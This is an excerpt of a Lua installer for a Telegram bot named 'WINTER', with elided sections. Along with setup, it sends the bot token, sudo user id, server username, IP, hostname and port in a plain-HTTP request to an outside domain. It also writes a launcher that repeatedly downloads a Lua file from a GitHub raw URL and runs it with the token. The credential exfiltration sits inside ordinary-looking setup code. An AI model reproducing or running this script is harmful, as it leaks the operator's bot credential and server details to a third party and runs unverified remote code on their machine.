...
local token = io.read()
if token ~= '' then
data,res = https.request("https://vvvzvv.ml/index/WINTER.php?p=WINTERTEAM")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://vvvzvv.ml/index/WINTER.php?bn=info&id="..Id)
if res == 200 then
...
http.request("https://vvvzvv.ml/index/WINTER.php?n=WINTERTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
local RunBot = io.open("WINTER", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/WINTER
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr WINTER.lua
wget "https://raw.githubusercontent.com/LARICATEAM/WINTER/main/WINTER.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./WINTER.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S WINTER -X kill
screen -S WINTER ./WINTER
done
]])
RunTs:close()
end
